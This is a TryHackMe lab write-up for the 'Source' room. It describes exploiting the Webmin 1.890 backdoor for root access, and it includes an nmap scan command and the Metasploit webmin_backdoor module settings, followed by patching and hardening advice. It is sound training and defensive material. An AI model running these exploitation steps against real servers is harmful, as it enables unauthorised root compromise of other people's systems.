---
title: "TryHackMe Writeup: Source"
date: 2025-12-11
description: "Exploitation of a known public backdoor in Webmin 1.890 resulting in unauthenticated Remote Command Execution as root."
tags: ["tryhackme", "webmin", "cve", "rce", "mitre-attack"]
layout: "page"
showPagination: true
showDate: true
showReadingTime: true
showWordCount: true
showAuthorBottom: true
---

### Executive Summary

A targeted security assessment identified a critical vulnerability in the server's infrastructure. The host was running Webmin version 1.890, which is known to contain a publicly disclosed supply-chain backdoor. Exploitation of this flaw permitted unauthenticated Remote Command Execution (RCE), immediately granting root-level privileges and resulting in total system compromise.

### Attack Chain (PTES Mapping)

#### 1. Reconnaissance
Full TCP port scanning identified SSH and an HTTP service running MiniServ 1.890 (Webmin) on port 10000.
```bash
nmap -sS -sV -Pn -O -p- -T4 10.67.170.253
```
* **MITRE Technique:** [T1595](https://attack.mitre.org/techniques/T1595/) - Active Scanning.

#### 2. Vulnerability Analysis
Version fingerprinting confirmed Webmin 1.890. This specific version was compromised at the source code level (supply chain attack), introducing a backdoor that allows arbitrary command execution via the `password_change.cgi` endpoint.
* **MITRE Technique:** [T1195.002](https://attack.mitre.org/techniques/T1195/002/) - Supply Chain Compromise: Compromise Software Supply Chain (Historical Context).

#### 3. Exploitation & Privilege Escalation
The vulnerability was leveraged using the Metasploit framework module `linux/http/webmin_backdoor`. The payload executed successfully, bypassing authentication.
```bash
use linux/http/webmin_backdoor
set RHOSTS 10.67.170.253
set RPORT 10000
run
```
* **MITRE Technique:** [T1190](https://attack.mitre.org/techniques/T1190/) - Exploit Public-Facing Application.

Because Webmin runs with root privileges by design, the resulting reverse shell inherited these permissions natively, requiring no further privilege escalation steps.
```bash
# Post-exploitation validation
whoami # root
```

### Recommendations (NIST SP 800-115)

* **Immediate Patching:** Upgrade Webmin to a secure, verified version (≥ 1.930). Verify GPG signatures of the downloaded packages to prevent supply-chain vulnerabilities.
* **Access Control:** Restrict access to the Webmin management interface (port 10000) using firewall rules (`ufw` or `iptables`). Access should only be permitted from trusted administrative IP ranges.
* **Service Hardening:** Configure Webmin to listen exclusively on the localhost interface (`bind=127.0.0.1` in `miniserv.conf`) and require administrators to access it securely via SSH tunneling.
* **Incident Response:** Given the nature of the backdoor, conduct a thorough forensic review for persistence mechanisms (e.g., rogue crontabs, altered files in `/etc/systemd/system/`) and rotate all system passwords and SSH keys.